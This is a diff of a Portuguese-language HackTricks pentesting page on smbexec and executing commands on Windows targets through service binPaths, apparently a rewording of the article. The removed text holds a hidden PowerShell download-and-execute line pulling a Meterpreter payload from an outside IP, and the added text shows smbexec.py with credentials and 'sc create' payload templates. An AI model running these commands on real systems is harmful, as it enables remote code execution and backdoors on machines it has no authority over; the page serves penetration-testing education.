@@ -2,55 +2,44 @@
 
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
-## Como funciona
+## Como Funciona
 
-**Smbexec funciona como Psexec.** Neste exemplo, **em vez** de apontar o "_binpath_" para um executável malicioso dentro da vítima, vamos **direcioná-lo** para **cmd.exe ou powershell.exe** e um deles irá baixar e executar o backdoor.
+**Smbexec** opera de maneira semelhante ao **Psexec**, visando **cmd.exe** ou **powershell.exe** no sistema da vítima para execução de backdoor, evitando o uso de executáveis maliciosos.
 
 ## **SMBExec**
-
-Vamos ver o que acontece quando o smbexec é executado, observando do lado do atacante e do alvo:
-
-![](../../.gitbook/assets/smbexec\_prompt.png)
-
-Então sabemos que ele cria um serviço "BTOBTO". Mas esse serviço não está presente na máquina alvo quando fazemos um `sc query`. Os logs do sistema revelam uma pista do que aconteceu:
-
-![](../../.gitbook/assets/smbexec\_service.png)
-
-O Nome do Arquivo de Serviço contém uma string de comando para executar (%COMSPEC% aponta para o caminho absoluto do cmd.exe). Ele ecoa o comando a ser executado para um arquivo bat, redireciona o stdout e stderr para um arquivo Temp, executa o arquivo bat e o deleta. De volta ao Kali, o script Python então puxa o arquivo de saída via SMB e exibe o conteúdo em nosso "pseudo-shell". Para cada comando que digitamos em nosso "shell", um novo serviço é criado e o processo é repetido. É por isso que não é necessário soltar um binário, ele apenas executa cada comando desejado como um novo serviço. Definitivamente mais furtivo, mas como vimos, um log de eventos é criado para cada comando executado. Ainda assim, uma maneira muito inteligente de obter um "shell" não interativo!
-
-## Manual SMBExec
-
-**Ou executando comandos via serviços**
-
-Como o smbexec demonstrou, é possível executar comandos diretamente de binPaths de serviços em vez de precisar de um binário. Isso pode ser um truque útil para ter na manga se você precisar executar apenas um comando arbitrário em uma máquina Windows alvo. Como um exemplo rápido, vamos obter um shell Meterpreter usando um serviço remoto _sem_ um binário.
-
-Usaremos o módulo `web_delivery` do Metasploit e escolheremos um alvo PowerShell com um payload Meterpreter reverso. O listener é configurado e ele nos diz o comando a executar na máquina alvo:
+```bash
+smbexec.py WORKGROUP/username:password@10.10.10.10
 ```
-powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
+A funcionalidade do smbexec envolve a criação de um serviço temporário (por exemplo, "BTOBTO") na máquina alvo para executar comandos sem deixar um binário. Esse serviço, construído para executar um comando através do caminho do cmd.exe (%COMSPEC%), redireciona a saída para um arquivo temporário e se deleta após a execução. O método é furtivo, mas gera logs de eventos para cada comando, oferecendo um "shell" não interativo repetindo esse processo para cada comando emitido pelo lado do atacante.
+
+## Executando Comandos Sem Binários
+
+Essa abordagem permite a execução direta de comandos via binPaths de serviço, eliminando a necessidade de binários. É particularmente útil para a execução de comandos pontuais em um alvo Windows. Por exemplo, usando o módulo `web_delivery` do Metasploit com um payload Meterpreter reverso direcionado para PowerShell, é possível estabelecer um ouvinte que fornece o comando de execução necessário. Criar e iniciar um serviço remoto na máquina Windows do atacante com o binPath configurado para executar esse comando via cmd.exe permite a execução do payload, apesar de possíveis erros de resposta do serviço, alcançando o retorno de chamada e a execução do payload no lado do ouvinte do Metasploit.
+
+### Exemplo de Comandos
+
+A criação e inicialização do serviço podem ser realizadas com os seguintes comandos:
+```cmd
+sc create [ServiceName] binPath= "cmd.exe /c [PayloadCommand]"
+sc start [ServiceName]
 ```
-Do nosso ataque Windows, criamos um serviço remoto ("metpsh") e definimos o binPath para executar cmd.exe com nosso payload:
+Para mais detalhes, consulte [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
-![](../../.gitbook/assets/sc\_psh\_create.png)
 
-E então o iniciamos:
-
-![](../../.gitbook/assets/sc\_psh\_start.png)
-
-Ele apresenta erro porque nosso serviço não responde, mas se olharmos para o nosso ouvinte do Metasploit, vemos que o callback foi feito e o payload executado.
-
-Todas as informações foram extraídas daqui: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+# Referências
+* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 <details>
 
@@ -58,10 +47,10 @@ Todas as informações foram extraídas daqui: [https://blog.ropnop.com/using-cr
 
 Outras formas de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
